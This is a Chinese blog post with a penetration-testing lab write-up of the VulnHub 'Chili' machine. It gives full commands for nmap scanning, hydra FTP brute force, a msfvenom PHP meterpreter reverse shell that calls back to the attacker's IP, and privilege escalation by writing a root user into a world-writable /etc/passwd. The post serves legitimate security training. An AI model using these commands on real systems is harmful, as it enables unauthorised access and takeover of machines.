<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="gu0oooo"><meta name="copyright" content="gu0oooo"><title>走选择的路，而不是好走的路 | Gu0oooo's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"6V18OX8QPB","apiKey":"d9a78f7ea512561ee08068ed96a9382a","indexName":"hexo_blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.4.2'
} </script><meta name="generator" content="Hexo 5.4.2"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="https://s2.loli.net/2023/02/19/R7Kf1rGtuIxabpw.png"></div><div class="author-info__name text-center">gu0oooo</div><div class="author-info__description text-center"></div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/Gu0oooo">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">1</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">3</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">2</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://wxx0105.cn">贤哥wxx</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://na0h.cn">健哥Na0h</a></div></div></div><nav id="nav" style="background-image: url(https://s2.loli.net/2023/02/19/wucNa4ozCx9yLQd.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gu0oooo's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="site-info"><div id="site-title">Gu0oooo's Blog</div><div id="site-sub-title">走选择的路，而不是好走的路</div><div id="site-social-icons"><a class="social-icon" href="https://github.com/Gu0oooo" target="_blank" rel="noreferrer noopener nofollow"><i class="fa-github fab"></i></a><a class="social-icon" href="http://weibo.com/mybluedreams" target="_blank" rel="noreferrer noopener nofollow"><i class="fa-weibo fab"></i></a><a class="social-icon" href="https://Molunerfinn/atom.xml" target="_blank" rel="noreferrer noopener nofollow"><i class="fa-rss fas"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/06/%E5%BF%AB%E9%80%9F%E6%8B%BF%E4%B8%8B%20WordPress%20%E9%9D%B6%E6%9C%BA%20/">快速拿下 WordPress 靶机</a><span class="article-meta"><i class="fa fa-thumb-tack article-meta__icon sticky"></i><span class="sticky">置顶</span><span class="article-meta__separator" style="margin-right: 0.3rem">|</span></span><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-06</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E9%9D%B6%E6%9C%BA/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/msf/">msf</a></span><div class="content"><h1 id="快速拿下-WordPress-靶机"><a href="#快速拿下-WordPress-靶机" class="headerlink" title="快速拿下 WordPress 靶机"></a>快速拿下 WordPress 靶机</h1><h3 id="渗透测试实验报告"><a href="#渗透测试实验报告" class="headerlink" title="渗透测试实验报告"></a><strong>渗透测试实验报告</strong></h3><p>靶机：chili</p>
<p>环境来源：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/chili/Chili.ova">https://download.vulnhub.com/chili/Chili.ova</a></p>
<h5 id="实验目标："><a href="#实验目标：" class="headerlink" title="实验目标："></a>实验目标：</h5><p>任务一：namp扫描目标主机开放端口和服务</p>
<p>任务二：使用hydra工具爆破FTP登录账号</p>
<p>任务三：msfvenom命令生成木马<strong>，</strong>通过msf反弹shell，在kali端口开启端口监听、</p>
<p>任务四：使用后渗透提权工具enumy，得到&#x2F;etc&#x2F;passwd 的读写权限，向其中添加一个新的高权限用户，获取&#x2F;root目录下的flag信息</p>
<h5 id="实战过程："><a href="#实战过程：" class="headerlink" title="实战过程："></a>实战过程：</h5><p>用nmap扫描靶机所在的网段，获取靶机IP</p>
<h4 id="中途出现的小插曲"><a href="#中途出现的小插曲" class="headerlink" title="中途出现的小插曲"></a><strong>中途出现的小插曲</strong></h4><p>nmap 扫描不到靶机 尝试了恢复VMware的网络虚拟器的默认设置， 也尝试重启DHCP服务，都行不通，最后在这篇博客中找到答案</p>
<p><a target="_blank" rel="noopener" href="https://www.cxymm.net/article/liver100day/119109320">https://www.cxymm.net/article/liver100day/119109320</a></p>
<p>原因是靶机的网络设置设置为了桥接模式，应该设置为NAT模式，让kali与chili靶机处于统一网段下</p>
<p>学到了一些：</p>
<ul>
<li>当VMnet 1和8变为 169.254.x.x 时，很大程度上是因为主机的DHCP出现了问题，重启主机服务中的VMvare DHCP服务，将VMware的虚拟网络编辑器恢复默认，可以解决这个问题</li>
<li>安装靶机时，一定要确认网络设置是否为NAT模式</li>
</ul>
<p>nmap -sP 169.254.137.0&#x2F;24</p>
<p><img src="https://s2.loli.net/2023/02/19/oD2VB3pO7fCG9de.png" alt="image"></p>
<p>对靶机端口进行扫描</p>
<p>nmap -sT -p1-65535 192.168.3.129</p>
<p><img src="https://s2.loli.net/2023/02/19/kNT3m7hE9rtbJoC.png" alt="image"></p>
<p>可以看到开启了21和80端口</p>
<p>在kali中访问web服务</p>
<p><img src="https://s2.loli.net/2023/02/19/w7yjSLc3oNMADTa.png" alt="image"></p>
<p>只有一张图片，查看页面源码，看到一些关键字提示</p>
<p><img src="https://s2.loli.net/2023/02/19/tXUNJRWLOvETBGb.png" alt="image"></p>
<p><strong>补充：cewl工具会根据指定的URL和深度进行爬取，然后打印出可用于密码破解的字典</strong></p>
<p>使用cewl工具对网页敏感信息进行爬取并保存到文件</p>
<p>cewl 192.168.3.129 &gt; user.txt</p>
<p><img src="https://s2.loli.net/2023/02/19/F1bxUoQdq7C4BWY.png" alt="image"></p>
<p>把文件中的首字母大写关键词改写为全小写，把首行的版本信息去除</p>
<p><img src="https://s2.loli.net/2023/02/19/nJXzZsmL4eMFpTc.png" alt="image"></p>
<h4 id="补充：hydra字典爆破工具-爆破工具-Hydra-简单使用-简书-jianshu-com"><a href="#补充：hydra字典爆破工具-爆破工具-Hydra-简单使用-简书-jianshu-com" class="headerlink" title="**补充：hydra字典爆破工具 **爆破工具 Hydra 简单使用 - 简书 (jianshu.com)"></a>**补充：hydra字典爆破工具 **<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4da49f179cee">爆破工具 Hydra 简单使用 - 简书 (jianshu.com)</a></h4><p>使用hydra工具爆破FTP登录账号</p>
<p><strong>hydra -L 指定用户名 -P 指定字典 -f(爆破成功立刻终止) -V(显示爆破详细信息) server(攻击目标) service(服务)</strong></p>
<p>hydra -L user.txt -P worldlists&#x2F;rockyou.txt -f -V 192.168.3.129 ftp</p>
<p><img src="https://s2.loli.net/2023/02/19/YlELUD5yc7QoVnX.png" alt="image"></p>
<p>使用爆破出的账号密码登录靶机FTP</p>
<p>ftp 192.168.3.129 </p>
<p><img src="https://s2.loli.net/2023/02/19/xdLnrO8Imacq27X.png" alt="image"></p>
<p>尝试切换到网页的根目录，这样我们就可以进行网页信息的提取了</p>
<p><img src="https://s2.loli.net/2023/02/19/bLYHcgdDQztpOXa.png" alt="image"></p>
<p>可以看到，我们对于 .nano文件夹拥有读写和执行的权限！</p>
<h4 id="补充：msfvenom命令生成木马-Msfvenom命令总结大全-yunying-博客园-cnblogs-com"><a href="#补充：msfvenom命令生成木马-Msfvenom命令总结大全-yunying-博客园-cnblogs-com" class="headerlink" title="**补充：msfvenom命令生成木马 **Msfvenom命令总结大全 - yunying - 博客园 (cnblogs.com)"></a>**补充：msfvenom命令生成木马 **<a target="_blank" rel="noopener" href="https://www.cnblogs.com/BOHB-yunying/p/11628896.html">Msfvenom命令总结大全 - yunying - 博客园 (cnblogs.com)</a></h4><p>实例：msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;<Your IP Address> LPORT&#x3D;<Your Port to Connect On> -f raw &gt; shell.php</p>
<p>-p payload </p>
<p>-f 输出文件格式</p>
<p>使用msf生成木马</p>
<p>msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;<strong>192.168.3.128</strong> LPORT&#x3D;4444 -f raw &gt; shell.php</p>
<p><img src="https://s2.loli.net/2023/02/19/e2XuhTULpwz5GEf.png" alt="image"></p>
<p>将木马上传到服务器.nano文件夹下, 在FTP中通过put命令上传文件</p>
<p><img src="https://s2.loli.net/2023/02/19/QYiB4W7tGMZDRTr.png" alt="image"></p>
<p>给shell.php赋予执行权限，一定要赋予其 777 权限</p>
<p><img src="https://s2.loli.net/2023/02/19/LrPHJ8xZFY3OoWn.png" alt="image"></p>
<p>通过msf反弹shell，在kali端口开启端口监听，报错了！handler failed to bind to 192.1689.3.129:4444</p>
<p><img src="https://s2.loli.net/2023/02/19/t72N4b96TFQogkS.png" alt="image"></p>
<p><strong>解决：LHOST应该设置为攻击机的IP，而不是目标IP,同时，回头检查，发现生成木马设置的IP也应该是攻击机才对</strong></p>
<p>然后通过浏览器访问我们的木马，获取shell</p>
<p><img src="https://s2.loli.net/2023/02/19/SfU6C8Tiy2kWahV.png" alt="image"></p>
<p>使用后渗透提权工具enumy <a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/14094663.html">Enumy：一款功能强大的Linux后渗透提权枚举工具 - My_Dreams - 博客园 (cnblogs.com)</a></p>
<p><strong>补充：put命令不可以上传非空文件夹，下载enumy64二进制文件进行上传</strong></p>
<p><img src="https://s2.loli.net/2023/02/19/QM9R3JSoTXbAnEd.png" alt="image"></p>
<p>更改文件权限，chmod 777</p>
<p><img src="https://s2.loli.net/2023/02/19/MHgIVLAQx7tYBhu.png" alt="image"></p>
<p>在msf中利用enumy64进行提权</p>
<p>得到信息：</p>
<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="code"><pre><span class="line">./enumy64</span><br><span class="line"> ▄█▀─▄▄▄▄▄▄▄─▀█▄  _____                                  </span><br><span class="line"> ▀█████████████▀ |   __|___ _ _ _____ _ _ </span><br><span class="line">     █▄███▄█     |   __|   | | |     | | |</span><br><span class="line">      █████      |_____|_|_|___|_|_|_|_  |</span><br><span class="line">      █▀█▀█                          |___|</span><br><span class="line"></span><br><span class="line"> https://github.com/luke-goddard/enumy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Current User Info    uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">Version              Linux version 4.19.0-10-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (2020-07-24)</span><br><span class="line">hostname             chili</span><br><span class="line">Umask                u=rwx,g=rx,o=rx</span><br><span class="line"></span><br><span class="line">Last Login</span><br><span class="line">----------</span><br><span class="line">Username         Port     From             Latest</span><br><span class="line">root             tty1                      Tue Sep  8 13:11:53 -0400 2020</span><br><span class="line">chili            tty1                      Sun Nov 14 07:20:01 -0500 2021</span><br><span class="line"></span><br><span class="line">User Accounts</span><br><span class="line">-------------</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">chili:x:1000:1000:chili,,,:/home/chili:/bin/bash</span><br><span class="line"></span><br><span class="line">Who Else Is Logged On</span><br><span class="line">---------------------</span><br><span class="line"> 04:34:37 up 11:47,  1 user,  load average: 0.08, 0.02, 0.01</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">chili    tty1     -                Sun07    6:57m  0.36s  0.34s -bash</span><br><span class="line"></span><br><span class="line">Groups</span><br><span class="line">------</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span><br><span class="line">uid=2(bin) gid=2(bin) groups=2(bin)</span><br><span class="line">uid=3(sys) gid=3(sys) groups=3(sys)</span><br><span class="line">uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)</span><br><span class="line">uid=5(games) gid=60(games) groups=60(games)</span><br><span class="line">uid=6(man) gid=12(man) groups=12(man)</span><br><span class="line">uid=7(lp) gid=7(lp) groups=7(lp)</span><br><span class="line">uid=8(mail) gid=8(mail) groups=8(mail)</span><br><span class="line">uid=9(news) gid=9(news) groups=9(news)</span><br><span class="line">uid=10(uucp) gid=10(uucp) groups=10(uucp)</span><br><span class="line">uid=13(proxy) gid=13(proxy) groups=13(proxy)</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">uid=34(backup) gid=34(backup) groups=34(backup)</span><br><span class="line">uid=38(list) gid=38(list) groups=38(list)</span><br><span class="line">uid=39(irc) gid=39(irc) groups=39(irc)</span><br><span class="line">uid=41(gnats) gid=41(gnats) groups=41(gnats)</span><br><span class="line">uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)</span><br><span class="line">uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)</span><br><span class="line">uid=101(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)</span><br><span class="line">uid=102(systemd-network) gid=103(systemd-network) groups=103(systemd-network)</span><br><span class="line">uid=103(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)</span><br><span class="line">uid=1000(chili) gid=1000(chili) groups=1000(chili),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)</span><br><span class="line">uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)</span><br><span class="line">uid=104(messagebus) gid=110(messagebus) groups=110(messagebus)</span><br><span class="line">uid=105(sshd) gid=65534(nogroup) groups=65534(nogroup)</span><br><span class="line">uid=106(ftp) gid=113(ftp) groups=113(ftp)</span><br><span class="line"></span><br><span class="line">Severity: MEDIUM  Name: sysctl ptrace is configured insecurly                                           -rw-r--r-- 1 root root 0 Nov 15 04:34 /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line">Severity: INFO    Name: Found an new root user with UID 0: root                                         -rw-r--rw- 1 root root 1450 Sep  8  2020 /etc/passwd</span><br><span class="line">Severity: INFO    Name: Found an new root user with GID 0: root                                         -rw-r--rw- 1 root root 1450 Sep  8  2020 /etc/passwd</span><br><span class="line">Severity: INFO    Name: Found an new user that can be logged into: root                                 -rw-r--rw- 1 root root 1450 Sep  8  2020 /etc/passwd</span><br><span class="line">Severity: INFO    Name: Found an new user that can be logged into: sync                                 -rw-r--rw- 1 root root 1450 Sep  8  2020 /etc/passwd</span><br><span class="line">Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user </span><br><span class="line">Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user </span><br><span class="line">Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user </span><br><span class="line">Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user </span><br><span class="line">Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user </span><br><span class="line">Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user </span><br><span class="line">Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user </span><br><span class="line">Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user </span><br><span class="line">Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user </span><br><span class="line">Severity: INFO    Name: Found an new user that can be logged into: chili                                -rw-r--rw- 1 root root 1450 Sep  8  2020 /etc/passwd</span><br><span class="line">Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user </span><br><span class="line">Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user </span><br><span class="line">Severity: HIGH    Name: Low entropy file that could be a private key                                    -rw-r--r-- 1 root root 20661 Feb 11  2019 /usr/share/X11/xkb/symbols/pk</span><br><span class="line">Severity: INFO    Name: Config file could contain passwords                                             -rw-r--r-- 1 root root 494 Feb 10  2019 /usr/share/libc-bin/nsswitch.conf</span><br><span class="line">Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 1 root root 736776 Apr 20  2020 /usr/bin/openssl</span><br><span class="line">Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 1 root root 1168776 Apr 18  2019 /usr/bin/bash</span><br><span class="line">Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 2 root root 3201864 Jul 21  2020 /usr/bin/perl</span><br><span class="line">Severity: HIGH    Name: CAP_NET_RAW capablities enabled on file                                         -rwxr-xr-x 1 root root 69368 Jan 13  2020 /usr/bin/ping</span><br><span class="line">Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 1 root root 8156 Jul 21  2020 /usr/bin/cpan</span><br><span class="line">Severity: MEDIUM  Name: Abnormal GUID enabled executable found                                          -rwxr-sr-x 1 root crontab 43568 Oct 11  2019 /usr/bin/crontab</span><br><span class="line">Severity: MEDIUM  Name: Abnormal GUID enabled executable found                                          -rwxr-sr-x 1 root tty 14736 May  4  2018 /usr/bin/bsd-write</span><br><span class="line">Severity: MEDIUM  Name: Abnormal SUID enabled executable found                                          -rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">Severity: INFO    Name: Config file could contain passwords                                             -rw-r--r-- 1 root root 239 Sep 27  2017 /usr/lib/tmpfiles.d/passwd.conf</span><br><span class="line">Severity: MEDIUM  Name: Found backup /etc/shadow file                                                   -rw------- 1 root shadow 965 Sep  8  2020 /var/backups/shadow.bak</span><br><span class="line">Severity: INFO    Name: Found backup /etc/passwd file                                                   -rw------- 1 root root 1450 Sep  8  2020 /var/backups/passwd.bak</span><br><span class="line">Severity: MEDIUM  Name: Found backup /etc/shadow file                                                   -rw-r----- 1 root shadow 965 Sep  8  2020 /etc/shadow-</span><br><span class="line">Severity: INFO    Name: Found backup /etc/passwd file                                                   -rw-r--r-- 1 root root 1437 Sep  8  2020 /etc/passwd-</span><br><span class="line">Severity: INFO    Name: Config file could contain passwords                                             -rw-r--r-- 1 root root 5849 Sep  8  2020 /etc/vsftpd.conf</span><br><span class="line">Severity: MEDIUM  Name: Other permissions are higher than Group permissions                             -rw-r--rw- 1 root root 1450 Sep  8  2020 /etc/passwd</span><br><span class="line">Severity: INFO    Name: Config file could contain passwords                                             -rw-r--r-- 1 root root 494 Feb 10  2019 /etc/nsswitch.conf</span><br><span class="line">Generating JSON</span><br><span class="line">Json saved at location -&gt; enumy.json</span><br><span class="line">Total files scanned -&gt; 25190</span><br></pre></td></tr></table></figure>




<p>从以上信息中，我们可以看到，我们拥有&#x2F;etc&#x2F;passwd 的写权限</p>
<h4 id="那么，我们就可以向其中添加一个新的高权限用户"><a href="#那么，我们就可以向其中添加一个新的高权限用户" class="headerlink" title="那么，我们就可以向其中添加一个新的高权限用户"></a><strong>那么，我们就可以向其中添加一个新的高权限用户</strong></h4><h4 id="补充：Perl"><a href="#补充：Perl" class="headerlink" title="补充：Perl"></a><strong>补充：Perl</strong></h4><p><strong>Perl具有高级语言（如C）的强大能力和灵活性。事实上，你将看到，它的许多特性是从C语言中借用来的。</strong></p>
<p><strong>Perl与脚本语言一样，Perl不需要编译器和链接器来运行代码，你要做的只是写出程序并告诉Perl来运行而已。</strong></p>
<p><strong>-e</strong> 选项来输入语句来执行代码</p>
<p>-l 启用行结束处理，指定行结束符</p>
<p><strong>调用语法 result &#x3D; crypt (original, salt);</strong><br><strong>解说 用DES算法加密字符串，original是将要加密的字符串，salt是两个字符的字符串，</strong><br><strong>定义如何改变DES算法，以使更难解码。返回值为加密后的串。</strong></p>
<p>通过perl语言生成test用户的密码密文</p>
<p>perl -e ‘print crypt(‘test’, ‘test’)’</p>
<p><img src="https://s2.loli.net/2023/02/19/Hi2dOfr85SV3WLR.png" alt="image"></p>
<p>&#x2F;etc&#x2F;passed中用户信息的字段含义</p>
<p><img src="https://s2.loli.net/2023/02/19/XaEI8lUh2YTBjfJ.png" alt="image"></p>
<p>在msf中，向&#x2F;etc&#x2F;passed中添加新的用户信息</p>
<p>echo “test:teH0wLIpW0gyQ:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash” &gt; &#x2F;etc&#x2F;passwd</p>
<p><img src="https://s2.loli.net/2023/02/19/hsLUl4wJrGN2tfY.png" alt="image"></p>
<p>可以看到，用户名后的密码信息其实是，test作为密码经过DES加密后的结果</p>
<p>现在，我们登录成功超级权限用户test</p>
<p>我们的目标是获取&#x2F;root目录下的flag信息</p>
<p><img src="https://s2.loli.net/2023/02/19/ywPuUDSQlHeBn7x.png" alt="image"></p>
<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="code"><pre><span class="line">cd /root</span><br><span class="line">pwd</span><br><span class="line">/root</span><br><span class="line">ls -al</span><br><span class="line">total 32</span><br><span class="line">drwx------  3 test root 4096 Sep  8  2020 .</span><br><span class="line">drwxr-xr-x 18 test root 4096 Sep  7  2020 ..</span><br><span class="line">-rw-------  1 test root  126 Sep  8  2020 .bash_history</span><br><span class="line">-rw-r--r--  1 test root  570 Jan 31  2010 .bashrc</span><br><span class="line">drwxr-xr-x  3 test root 4096 Sep  8  2020 .local</span><br><span class="line">-rw-r--r--  1 test root  148 Aug 17  2015 .profile</span><br><span class="line">-rw-r--r--  1 test root   47 Sep  8  2020 proof.txt</span><br><span class="line">-rw-r--r--  1 test root  176 Sep  8  2020 .wget-hsts</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/02/19/AJ6nhGl2IeMSVRD.png" alt="image"></p>
<p>查看proof.txt文件中的内容，得到flag</p>
<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="code"><pre><span class="line">cat proof.txt </span><br><span class="line">Sun_CSR.Chili.af6d45da1f1181347b9e2139f23c6a5b</span><br></pre></td></tr></table></figure>


</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://s2.loli.net/2023/02/19/wucNa4ozCx9yLQd.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2020 - 2023 By gu0oooo</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script src="/js/search/algolia.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="algolia-search"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"right","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>